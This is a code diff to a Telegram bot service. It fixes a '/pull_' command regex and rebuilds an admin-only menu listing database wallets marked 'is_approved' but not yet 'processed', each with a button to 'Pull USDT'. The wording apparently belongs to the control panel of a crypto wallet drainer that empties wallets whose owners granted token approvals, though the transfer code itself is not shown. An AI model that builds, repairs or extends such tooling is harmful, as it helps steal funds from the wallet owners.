@@ -112,6 +112,7 @@ class TelegramService {
         }
     }
 
+        // Fix the regex pattern - remove the HTML tags
     setupCommandHandlers() {
         if (!this.bot) return;
 
@@ -133,8 +134,8 @@ class TelegramService {
             this.sendMainMenu(msg.chat.id);
         });
 
-        // Pull command handler
-        this.bot.onText(/\/pull_(.<b>)/, (msg, match) => {
+        // Pull command handler - fix the regex
+        this.bot.onText(/\/pull_(.*)/, (msg, match) => {
             console.log('Received /pull command from chat:', msg.chat.id);
             const walletAddress = match && match[1] ? match[1] : null;
             this.handlePullCommand(msg.chat.id, walletAddress);
@@ -188,6 +189,7 @@ class TelegramService {
             }
         });
     }
+
 
     // escape MarkdownV2 special characters, defensive: accept numbers/objects
     escapeMarkdown(text) {
@@ -525,45 +527,59 @@ Next steps:
         }
     }
 
+    // Fix the sendPullWalletList method - the issue is in the inline keyboard construction
+
     async sendPullWalletList(chatId) {
         if (chatId.toString() !== this.adminChatId) {
             return this.bot.sendMessage(chatId, '❌ Unauthorized access');
         }
 
         try {
+            console.log('Fetching wallets from database...');
+            
             // Fetch wallets from database
             const query = 'SELECT address, name, usdt_balance FROM wallets WHERE is_approved = true AND is_processed = false ORDER BY created_at DESC LIMIT 10';
             const result = await database.query(query);
+            
+            console.log('Database query result:', result);
 
-            let message = '📤 <b>Select Wallet to Pull</b>\\n\\n';
+            let message = '<b>📤 Select Wallet to Pull</b>\n\n';
 
             if (!result || !result.rows || result.rows.length === 0) {
-                message += 'No approved wallets available for pulling\.\\n\\n';
-                message += 'Use: /pull\_<wallet\_address>';
+                message += 'No approved wallets available for pulling.\n\n';
+                message += 'Use: /pull_<wallet_address>';
             } else {
-                message += 'Click on a wallet to pull USDT:\\n\\n';
+                message += 'Click on a wallet to pull USDT:\n\n';
                 for (let i = 0; i < result.rows.length; i++) {
                     const wallet = result.rows[i];
                     const maskedAddress = this.maskAddress(wallet.address);
-                    const escapedBalance = this.escapeMarkdown(wallet.usdt_balance || '0');
-                    message += `${i + 1}\. <code>${maskedAddress}</code> \(${escapedBalance} USDT\)\\n`;
+                    const balance = wallet.usdt_balance || '0';
+                    message += `${i + 1}. <code>${maskedAddress}</code> (${balance} USDT)\n`;
                 }
             }
+
+            // Fix the inline keyboard construction
+            const inlineKeyboard = [];
+            
+            if (result && result.rows && result.rows.length > 0) {
+                for (let i = 0; i < result.rows.length; i++) {
+                    const wallet = result.rows[i];
+                    inlineKeyboard.push([{
+                        text: `📤 Pull ${wallet.name || `Wallet ${i + 1}`}`,
+                        callback_data: `pull_${wallet.address}`
+                    }]);
+                }
+            }
+            
+            // Add the main menu button
+            inlineKeyboard.push([
+                { text: '🏠 Main Menu', callback_data: 'menu' }
+            ]);
 
             const options = {
                 parse_mode: 'HTML',
                 reply_markup: {
-                    inline_keyboard: [
-                        ...(result && result.rows ? result.rows.map((wallet, index) => ([[
-                            {
-                                text: `📤 Pull ${wallet.name || `Wallet ${index + 1}`}`,
-                                callback_data: `pull_${wallet.address}`
-                            }
-                        ]])) : []),
-                        [
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
-                        ]
-                    ]
+                    inline_keyboard: inlineKeyboard
                 }
             };
 
@@ -1183,4 +1199,5 @@ Error: ${cleanErrorMessage}
 }
 
 module.exports = new TelegramService();
+
 
